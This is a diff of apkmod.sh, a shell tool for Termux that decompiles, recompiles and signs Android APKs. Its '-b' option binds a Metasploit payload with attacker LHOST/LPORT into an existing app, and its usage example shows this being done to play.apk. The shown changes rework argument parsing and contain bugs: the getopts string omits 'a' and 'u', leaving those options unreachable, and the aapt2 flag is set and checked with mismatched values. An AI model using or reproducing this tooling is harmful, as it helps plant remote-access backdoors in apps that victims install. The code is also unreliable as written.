@@ -7,7 +7,7 @@
 ########################################
 
 CWD=$(pwd)
-VERSION="1.1"
+VERSION="1.2"
 
 #colors
 cyan='\033[1;36m'                       
@@ -19,7 +19,7 @@ purple='\033[1;35m'
 reset='\033[0m'
 
 usage() {
-	printf "${yellow}Usage: apkmod [option] [EXTRAARGS] [/path/to/input.apk] [/path/to/output.apk]\n${purple}valid options are:${blue}\n  -v		print version\n  -d		For decompiling\n  -r		For recompiling\n  -s		For signing\n  -b		For binding payload\n${yellow}Example:\n  ${blue}apkmod -b 127.0.0.1 4444 /sdcard/apps/play.apk /sdcard/apps/binded_play.apk  ${purple}bind the payload with play.apk and saves output in given directory.\n${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
+	printf "${yellow}Usage: apkmod [option] [EXTRAARGS] [/path/to/input.apk] [/path/to/output.apk]\n${purple}valid options are:${blue}\n  -v		print version\n  -d		For decompiling\n  -r		For recompiling\n  -s		For signing\n  -b		For binding payload\n  -o\t\tSpecify output file or directory\n  -a\t\tUse aapt2\n${yellow}Example:\n  ${blue}apkmod -b /sdcard/apps/play.apk -o /sdcard/apps/binded_play.apk LHOST=127.0.0.1 LPORT=4444  ${purple}bind the payload with play.apk and saves output in given directory.\n${green}Apkmod is like a bridge between your termux and alpine by which you can easily decompile recompile signapk and even bind the payload using metasploit\n${reset}"
 }
 
 error_msg() {
@@ -47,18 +47,34 @@ dir_exist() {
 decompile() {
 	print_status "Decompiling ${1}"
 	apktool d -f ${1} -o ${2}
+    if [ ! -e ${2} ]; then
+        error_msg "Can't bind, take screenshot and open a issue on github"
+        exit 1
+    fi
 	print_status "Decompiled into ${2}"
 }
 
 recompile() {
 	print_status "Recompiling ${1}"
-	apktool b -a /usr/bin/aapt -o ${2} ${1}
+    if [ "${USE_AAPT2}" = "yes" ]; then
+        apktool b --use-aapt2 /usr/bin/aapt2 -o ${2} ${1}
+    else
+        apktool b -a /usr/bin/aapt -o ${2} ${1}
+    fi
+    if [ ! -e ${2} ]; then
+        error_msg "Can't recompile, take screenshot and open a issue on github"
+        exit 1
+    fi
 	print_status "Recompiled to ${2}"
 }
 
 signapk() {
 	print_status "Signing ${1}"
 	apksigner -p android keystore ${1} ${2}
+    if [ ! -e ${2} ]; then
+        error_msg "Can't sign, take screenshot and open a issue on github"
+        exit 1
+    fi
 	print_status "Signed to ${2}"
 }
 
@@ -86,10 +102,8 @@ validate_input() {
 			usage
 			exit 1
 		fi
-		LHOST=${2}
-		LPORT=${3}
-		file_exist "${4}"
-		dir_exist "${5%\/*}"
+		file_exist "${2}"
+		dir_exist "${3%\/*}"
 	fi
 	if [ ! "${1}" = "-b" -a "$#" -ne 3 ]; then
 		usage
@@ -112,7 +126,7 @@ validate_input() {
 ###############################
 
 update() {
-	temp=$(curl -L -s https://github.com/Hax4us/Apkmod/raw/master/apkmod.sh | grep -w VERSION=)
+	temp=$(curl -L -s https://github.com/Hax4us/Apkmod/raw/master/apkmod.sh | grep -w "VERSION=" | head -n1)
 	N_VERSION=$(echo ${temp} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ]; then
 		[ 1 -eq $(echo "${N_VERSION} != ${VERSION}" | bc -l) ] && print_status "Update is available, run [ apkmod -u ] for update" && exit 1
@@ -132,38 +146,81 @@ if [ $? -eq 0 ]; then
     update
 fi
 
-if [ "${1}" = "-h" -o "${1}" = "" ]; then
-	usage
-	exit 1
-elif [ "${1}" = "-v" ]; then
-	printf "${yellow}${VERSION}\n${reset}"
-elif [ "${1}" = "-u" ]; then
-	print_status "Updating ..."
-	update ${1}
-	print_status "Update completed"
-	exit
+if [ $# -eq 0 ]; then
+    usage
+    exit 1
 fi
 
-if [ "${1}" = "-d" -o "${1}" = "-r" -o "${1}" = "-s" ]; then
-	in_abs_path=$(readlink -f ${2})
-	out_abs_path=$(readlink -f ${3})
+while getopts ":d:r:s:b:o:hv" opt; do
+    case $opt in
+        d)
+            echo "-d triggered with $OPTARG"
+            ACTION="decompile"
+            ARG="-d"
+            in_abs_path=$(readlink -f ${OPTARG})
+            ;;
+        r)
+            echo "-r triggered with $OPTARG"
+            ACTION="recompile"
+            ARG="-r"
+            in_abs_path=$(readlink -f ${OPTARG})
+            ;;
+        s)
+            echo "-s triggered with $OPTARG"
+            ACTION="signapk"
+            ARG="-s"
+            in_abs_path=$(readlink -f ${OPTARG})
+            ;;
+        b)
+            echo "-b triggered with $OPTARG"
+            ACTION="bindapk"
+            ARG="-b"
+            in_abs_path=$(readlink -f ${OPTARG})
+            LHOST=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LHOST | cut -d "=" -f2)
+            LPORT=$(echo "$@" | sed -e "s/ /\\n/g" | grep -i LPORT | cut -d "=" -f2)
+            ;;
+        o)
+            echo "-o with $OPTARG"
+            out_abs_path=$(readlink -f ${OPTARG})
+            ;;
+        a)
+            USE_AAPT2="TRUE"
+            ;;
+        h)
+            usage
+            exit 0
+            ;;
+        v)
+            printf "${yellow}${VERSION}\n${reset}"
+            exit 0
+            ;;
+        u)
+            print_status "Updating ..."
+            update ${opt}
+            print_status "Update completed"
+            exit 0
+            ;;
+        \?)
+            error_msg "Invalid option: -$OPTARG"
+            exit 1
+            ;;
+        :)
+            error_msg "option -$OPTARG requires an argument"
+            exit 1
+            ;;
+    esac
+done
+
+## Lets validate user's input
+if [ "${ARG}" = "-d" ]; then
+    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
+elif [ "${ARG}" = "-r" ]; then
+    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
+elif [ "${ARG}" = "-s" ]; then
+    validate_input ${ARG} ${in_abs_path} ${out_abs_path}
+elif [ "${ARG}" = "-b" ]; then
+    validate_input ${ARG} ${in_abs_path} ${out_abs_path} ${LHOST} ${LPORT}
 fi
 
-if [ "${1}" = "-d" ]; then
-	validate_input -d ${in_abs_path} ${out_abs_path}
-	decompile ${in_abs_path} ${out_abs_path}
-elif [ "${1}" = "-r" ]; then
-	validate_input -r ${in_abs_path} ${out_abs_path}
-	recompile ${in_abs_path} ${out_abs_path}
-elif [ "${1}" = "-s" ]; then
-	validate_input -s ${in_abs_path} ${out_abs_path}
-	signapk ${2} ${3}
-elif [ "${1}" = "-b" ]; then
-	in_abs_path=$(readlink -f ${4})
-	out_abs_path=$(readlink -f ${5})
-	validate_input -b ${2} ${3} ${in_abs_path} ${out_abs_path}
-	bindapk ${2} ${3} ${in_abs_path} ${out_abs_path}
-else
-	error_msg "Invalid input"
-fi
-
+## Lhost or lport will be ignored for all actions except bindapk
+${ACTION} ${LHOST} ${LPORT} ${in_abs_path} ${out_abs_path}
